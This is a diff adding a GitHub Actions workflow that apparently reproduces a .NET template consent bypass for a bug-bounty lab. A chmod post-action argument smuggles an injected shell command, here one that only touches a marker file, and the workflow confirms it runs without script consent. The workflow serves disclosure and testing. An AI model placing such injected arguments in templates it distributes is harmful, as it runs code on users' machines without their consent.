@@ -1,0 +1,137 @@
+name: dotnet-template-chmod-consent-lab
+
+on:
+  push:
+    branches:
+      - dotnet-bounty-lab-20260921
+    paths:
+      - .github/workflows/dotnet-template-chmod-consent-lab.yml
+
+permissions:
+  contents: read
+
+jobs:
+  reproduce:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install current .NET 10 SDK
+        uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: '10.0.x'
+
+      - name: Build benign template fixtures
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf /tmp/dotnet-template-lab /tmp/PROCESSSTART_MARKER /tmp/CHMOD_BYPASS_MARKER
+          mkdir -p /tmp/dotnet-template-lab/control/.template.config
+          mkdir -p /tmp/dotnet-template-lab/chmod/.template.config
+
+          cat > /tmp/dotnet-template-lab/control/victim.txt <<'EOF'
+          control
+          EOF
+          cat > /tmp/dotnet-template-lab/control/.template.config/template.json <<'EOF'
+          {
+            "$schema": "http://json.schemastore.org/template",
+            "author": "Security Lab",
+            "classifications": ["Test"],
+            "identity": "SecurityLab.ProcessStartControl.20260921",
+            "name": "Security Lab ProcessStart control",
+            "shortName": "securitylab-process-control",
+            "tags": { "type": "item" },
+            "postActions": [
+              {
+                "id": "control",
+                "description": "Benign marker control",
+                "manualInstructions": [],
+                "actionId": "3A7C4B45-1F5D-4A30-959A-51B88E82B5D2",
+                "args": {
+                  "executable": "/bin/sh",
+                  "args": "-c \"touch /tmp/PROCESSSTART_MARKER\""
+                },
+                "continueOnError": false
+              }
+            ]
+          }
+          EOF
+
+          cat > /tmp/dotnet-template-lab/chmod/victim.txt <<'EOF'
+          chmod
+          EOF
+          cat > /tmp/dotnet-template-lab/chmod/.template.config/template.json <<'EOF'
+          {
+            "$schema": "http://json.schemastore.org/template",
+            "author": "Security Lab",
+            "classifications": ["Test"],
+            "identity": "SecurityLab.ChmodBypass.20260921",
+            "name": "Security Lab chmod consent bypass",
+            "shortName": "securitylab-chmod-bypass",
+            "tags": { "type": "item" },
+            "postActions": [
+              {
+                "id": "chmod",
+                "description": "Benign chmod action",
+                "manualInstructions": [],
+                "actionId": "CB9A6CF3-4F5C-4860-B9D2-03A574959774",
+                "args": {
+                  "600 victim.txt; touch /tmp/CHMOD_BYPASS_MARKER; #": "victim.txt"
+                },
+                "continueOnError": false
+              }
+            ]
+          }
+          EOF
+
+      - name: Install fixtures and print SDK
+        shell: bash
+        run: |
+          set -euo pipefail
+          dotnet --info
+          dotnet new install /tmp/dotnet-template-lab/control
+          dotnet new install /tmp/dotnet-template-lab/chmod
+
+      - name: Negative control - ProcessStart is denied
+        shell: bash
+        run: |
+          set -u
+          rm -f /tmp/PROCESSSTART_MARKER
+          rm -rf /tmp/process-control-output
+          set +e
+          dotnet new securitylab-process-control -o /tmp/process-control-output --allow-scripts no
+          rc=$?
+          set -e
+          echo "PROCESSSTART_EXIT_CODE=$rc"
+          if test -e /tmp/PROCESSSTART_MARKER; then
+            echo "PROCESSSTART_DENY_CONTROL=FAIL"
+            exit 1
+          fi
+          echo "PROCESSSTART_DENY_CONTROL=PASS"
+
+      - name: Show chmod template has no allow-scripts consent option
+        shell: bash
+        run: |
+          set -euo pipefail
+          dotnet new securitylab-chmod-bypass --help | tee /tmp/chmod-help.txt
+          if grep -q -- "--allow-scripts" /tmp/chmod-help.txt; then
+            echo "CHMOD_TEMPLATE_ALLOW_SCRIPTS_OPTION=PRESENT"
+            exit 1
+          fi
+          echo "CHMOD_TEMPLATE_ALLOW_SCRIPTS_OPTION=ABSENT"
+
+      - name: Reproduce chmod shell execution without script consent
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -f /tmp/CHMOD_BYPASS_MARKER
+          rm -rf /tmp/chmod-output
+          dotnet new securitylab-chmod-bypass -o /tmp/chmod-output
+          if ! test -e /tmp/CHMOD_BYPASS_MARKER; then
+            echo "CHMOD_CONSENT_BYPASS=NOT_REPRODUCED"
+            exit 1
+          fi
+          mode=$(stat -c '%a' /tmp/chmod-output/victim.txt)
+          echo "CHMOD_OUTPUT_MODE=$mode"
+          echo "CHMOD_CONSENT_BYPASS=CONFIRMED"
